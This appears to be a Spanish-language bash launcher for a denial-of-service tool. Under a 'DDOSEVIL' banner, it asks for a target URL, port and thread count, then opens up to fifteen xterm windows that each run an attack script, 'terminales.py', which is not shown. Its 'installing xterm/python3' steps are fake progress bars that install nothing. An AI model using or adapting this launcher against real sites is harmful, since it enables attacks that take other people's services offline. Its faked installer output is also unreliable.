#!/bin/bash
clear

# Si vas a copiarme el script dame creditos porfa jiji



                                blanco="\033[1;37m"
                                morado1="\033[0;35m"
                                rojo="\033[1;31m"
                                amarillo="\033[1;33m"
                                morado2="\033[0;35m"
                                Cyan="\033[0;36m"
                                azulito="\033[1;34m"


echo -e "$morado2        ▓█████▄ ▓█████▄  ▒█████    ██████ ▓█████ ██▒   █▓ ██▓ ██▓        "
echo -e "$morado2        ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ▓█   ▀▓██░   █▒▓██▒▓██▒        "
echo -e "$morado2        ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ▒███   ▓██  █▒░▒██▒▒██░         "
echo -e "$morado2        ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒▒▓█  ▄  ▒██ █░░░██░▒██░         "
echo -e "$morado2        ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒░▒████▒  ▒▀█░  ░██░░██████▒   "
echo -e "$morado2        ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░       "
echo -e "$morado2        ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░         "
echo -e "$morado2        ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░       ░░   ▒ ░  ░ ░              "
echo -e "$morado2          ░       ░        ░ ░        ░     ░  ░     ░   ░      ░  ░            "
echo -e "$morado2          ░       ░                                   ░                           "

echo -e "$rojo                       Creado por hackingboy2020 ;)                             "





# Xterm y python3
                                                                                
if xterm -version &>/dev/null; then
    echo -e "$amarillo Xterm esta instalado"
else
echo -e "\e[94mInstalando Xterm...\e[0m"
progressbar()
{
    bar="------------------------------------------"
    
}


pid=$!

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done 

kill $pid > /dev/null 2>&1

fi  
if command -v python3 &>/dev/null; then
    echo -e "$amarillo Python 3 esta instalado $nc"
else

echo -e "\e[94mSe esta instalando python3....\e[0m"
progressbar()
{
    bar="----------------------------------------"
 
}


pid=$!

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done  

kill $pid > /dev/null 2>&1 

fi
read -p $'\033[0;37mEscribe la url de la pagina\e[0m     = ' web
read -p $'\033[0;37mPon el puerto a atacar  \e[0m      = ' port
read -p $'\033[0;37mEscribe los hilos[120]\e[0m = ' thread

echo "------------------------------------------------------------------------------                         "
echo -e "$amarillo Elije:                                                           -                        "
echo "------------------------------------------------------------------------------                         "
echo -e "-$azulito (1) = Una terminal DdoS                                          -              "
echo -e "-$azulito (2) = Dos terminales DdoS                                        -              " 
echo -e "-$azulito (3) = Tres terminales DdoS                                       -              "
echo -e "-$azulito (4) = Cuatro terminales DdoS                                     -              "
echo -e "-$azulito (5) = Cinco terminales DdoS                                      -              "
echo -e "-$azulito (6) = Seis terminales DdoS                                       -              "
echo -e "-$azulito (7) = Siete terminales DdoS                                      -              "
echo -e "-$azulito (8) = Ocho terminales DdoS                                       -              "
echo -e "-$azulito (9) = Nueve terminales DdoS                                      -              "
echo -e "-$azulito (10) = Diez terminales DdoS                                      -              "
echo -e "-$azulito (11) = Once terminales DdoS                                      -              "
echo -e "-$azulito (12) = Doce terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)      -              "
echo -e "-$azulito (13) = Trece terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)     -              "
echo -e "-$azulito (14) = Catorce terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)   -              "
echo -e "-$azulito (15) = Quince terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)    -              "
echo "------------------------------------------------------------------------------                                 "
echo -e "---------------------------"
read -p " ESCRIBE LAS TERMINALES QUE QUIERAS DEL 1-15  = " SA



if [ $SA = 1 ]; then
xterm -e python3 terminales.py -s $web -p $port -t $thread &
fi

if [ $SA = 2 ]; then
for i in {1..2}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done


fi
if [ $SA = 3 ]; then
for i in {1..3}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 4 ]; then
for i in {1..4}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 5 ]; then
for i in {1..5}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 6 ]; then
for i in {1..6}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 7 ]; then
for i in {1..7}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 8 ]; then
for i in {1..8}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 9 ]; then
for i in {1..9}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 10 ]; then
for i in {1..10}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 11 ]; then
for i in {1..11}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 12 ]; then
for i in {1..12}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 13 ]; then
for i in {1..13}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 14 ]; then
for i in {1..14}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 15 ]; then
for i in {1..15}
do xterm -e python3 terminales.py -s $web -p $port -t $thread &
done
fi

echo "$rojo HERRAMIENTA CERRADA "



